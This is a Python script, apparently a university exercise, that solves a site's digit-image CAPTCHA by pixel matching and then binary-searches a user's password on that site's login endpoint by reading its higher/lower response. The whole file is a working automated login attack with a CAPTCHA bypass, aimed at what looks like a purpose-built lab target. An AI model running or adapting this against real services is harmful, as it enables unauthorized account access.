#import json
#from PIL import Image
#from io import BytesIO
#import requests
#from requests.sessions import Session
print(610399206)
print(63869381748198450838)
def p1():
    img0Req=requests.get("http://utproject.ir/bp/Numbers/0.jpg")
    fileimg0Req=BytesIO(img0Req.content)
    img0Res=Image.open(fileimg0Req)
    img0Res=img0Res.convert("L") 
    red=img0Res.load() 
    zero = []
    for i in range(40):
        for j in range(40):
            zero.append(red[i,j])
    img1Req=requests.get("http://utproject.ir/bp/Numbers/1.jpg")
    fileimg1Req=BytesIO(img1Req.content)
    img1Res=Image.open(fileimg1Req)
    img1Res=img1Res.convert("L") 
    red=img1Res.load() 
    one = []
    for i in range(40):
        for j in range(40):
            one.append(red[i,j])
    img2Req=requests.get("http://utproject.ir/bp/Numbers/2.jpg")
    fileimg2Req=BytesIO(img2Req.content)
    img2Res=Image.open(fileimg2Req)
    img2Res=img2Res.convert("L") 
    red=img2Res.load() 
    two = []
    for i in range(40):
        for j in range(40):
            two.append(red[i,j])
    img3Req=requests.get("http://utproject.ir/bp/Numbers/3.jpg")
    fileimg3Req=BytesIO(img3Req.content)
    img3Res=Image.open(fileimg3Req)
    img3Res=img3Res.convert("L") 
    red=img3Res.load() 
    three= []
    for i in range(40):
        for j in range(40):
            three.append(red[i,j])
    img4Req=requests.get("http://utproject.ir/bp/Numbers/4.jpg")
    fileimg4Req=BytesIO(img4Req.content)
    img4Res=Image.open(fileimg4Req)
    img4Res=img4Res.convert("L") 
    red=img4Res.load() 
    four = []
    for i in range(40):
        for j in range(40):
            four.append(red[i,j])
    img5Req=requests.get("http://utproject.ir/bp/Numbers/5.jpg")
    fileimg5Req=BytesIO(img5Req.content)
    img5Res=Image.open(fileimg5Req)
    img5Res=img5Res.convert("L") 
    red=img5Res.load() 
    five = []
    for i in range(40):
        for j in range(40):
            five.append(red[i,j])
    img6Req=requests.get("http://utproject.ir/bp/Numbers/6.jpg")
    fileimg6Req=BytesIO(img6Req.content)
    img6Res=Image.open(fileimg6Req)
    img6Res=img6Res.convert("L") 
    red=img6Res.load() 
    six = []
    for i in range(40):
        for j in range(40):
            six.append(red[i,j])
    img7Req=requests.get("http://utproject.ir/bp/Numbers/7.jpg")
    fileimg7Req=BytesIO(img7Req.content)
    img7Res=Image.open(fileimg7Req)
    img7Res=img7Res.convert("L") 
    red=img7Res.load() 
    seven = []
    for i in range(40):
        for j in range(40):
            seven.append(red[i,j])
    img8Req=requests.get("http://utproject.ir/bp/Numbers/8.jpg")
    fileimg8Req=BytesIO(img8Req.content)
    img8Res=Image.open(fileimg8Req)
    img8Res=img8Res.convert("L") 
    red=img8Res.load() 
    eight = []
    for i in range(40):
        for j in range(40):
            eight.append(red[i,j])
    img9Req=requests.get("http://utproject.ir/bp/Numbers/9.jpg")
    fileimg9Req=BytesIO(img9Req.content)
    img9Res=Image.open(fileimg9Req)
    img9Res=img9Res.convert("L") 
    red=img9Res.load() 
    nine = []
    for i in range(40):
        for j in range(40):
            nine.append(red[i,j])
    mini = 0
    maxa = 10**20 - 1
    while 1: 
        ses=Session()
        ri=ses.get("http://utproject.ir/bp/image.php")
        file = BytesIO(ri.content)
        img = Image.open(file)
        img = img.convert('L')
        img.save('x.png')
        ot = Image.open('x.png')
        al = ot.load()
        chap = []
        imi = 0
        ima = 40
        for t in range(5):
            for i in range(imi,ima):
                for j in range(40):
                    chap.append(al[i,j])
            imi = ima
            ima += 40   
        num = ''
        im = 0
        ma = 0
        for i in range(1,6):
            ma = 40*40*i
            if chap[im:ma] == zero:
                num += '0'
            if chap[im:ma] == one:
                num += '1'
            if chap[im:ma] == two:
                num += '2'
            if chap[im:ma] == three:
                num += '3'
            if chap[im:ma] == four:
                num += '4'
            if chap[im:ma] == five:
                num += '5'
            if chap[im:ma] == six:
                num += '6'
            if chap[im:ma] == seven:
                num += '7'
            if chap[im:ma] == eight:
                num += '8'
            if chap[im:ma] == nine:
                num += '9'
            im = ma
        chapa = num
        mid = (mini+maxa)//2
        r=ses.post("http://utproject.ir/bp/login.php",data={"username":610399206,
        "password":mid,"captcha":int(chapa)})
        r = json.loads(r.text) 
        if r['stat'] == -1:
            mini = mid
        elif r['stat'] == 1:
            maxa = mid
        elif r['stat'] == 0:
            print(610399206)
            print(mid)
            break


    
    

    




        
